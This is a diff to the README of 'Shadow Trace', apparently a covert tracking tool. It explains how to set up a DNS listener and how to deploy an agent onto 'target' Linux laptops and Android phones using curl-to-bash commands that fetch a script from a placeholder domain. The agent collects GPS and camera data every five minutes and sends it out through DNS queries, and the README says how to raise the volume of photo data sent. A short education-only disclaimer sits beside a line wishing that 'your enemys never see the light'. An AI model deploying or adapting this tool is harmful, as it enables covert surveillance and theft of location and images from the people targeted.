@@ -44,35 +44,67 @@ Because DNS traffic is rarely blocked or inspected deeply, this method is Extrem
    sudo systemctl stop systemd-resolved
    sudo systemctl disable systemd-resolved
 ## INSTALL DEPENDENCIES
-`pip3 install dnslib flask`
-
+```bash
+pip3 install dnslib flask
+```
 
 ## RUN THE DNS LISTENER
-`cd server`
+```bash
+cd server
 `sudo python3 dnslistener.py`
 (Leave it running in the background or use `tmux`.)
+```
 
  ## (OPTIONAL) RUN THE DQASHBOARD 
- `python3 ap.py`
-
+ ```bash
+ python3 ap.py
+```
  ## Deploying the Agent
 **Linux Laptop**
 Host agent.sh on your server (e.g., with python3 -m http.server 8080 from the agent folder).
 On the target laptop, execute:
 ON LAPTOP EXECUTE....
+```bash
 `curl -sL http://youromain.com:8080/agent.sh | bash`
+```
 
 
-### Android Phone (via Termux)
+# Android Phone (via Termux)
 Install Termux from F-Droid and then Termux:API (for GPS & camera).
 Insite Termux, install needed packages:
-bash
-Copy
+```bash
+
 pkg install termux-api curl jq dnsutils
-Download and run the agent:
-bash
-Copy
+```
+# Download and run the agent:
+```bash
 curl -sL http://youromain.com/agent.sh -o agent.sh && bash agent.sh
+```
 Grant GPS and camera permissions when the prompt appears.
-The agent will now execute every 5 minutes via crontab.
+# The agent will now execute every 5 minutes via crontab.
 ---■
+
+## DEMO DASH BOARD
+
+
+
+
+
+
+## Customization
+** Replace al occurrences of track.youromain.com with your domain inside `agent.sh` and `dnslistener.py`.
+To change the exfil interval, adjust the cron entry inside `agent.sh` (default `*/5 * * * *`).
+To store more data, increase the `head -c 200` of the photo fragment (up to about 2000 characters per DNS query is possible but reliability may drop).
+---■
+## Disclimer (Legal)
+This software is provided for education and research purposes ony. The author is not responsable for any illegal use. By using Shadow Trace, you agre to only deploy it on devices you own or have explicit permission to monitor.
+
+---■
+ ## Auther
+HACKER THE_MANSSS
+
+## Shoutout
+# May your enemys never see the light. 
+
+
+
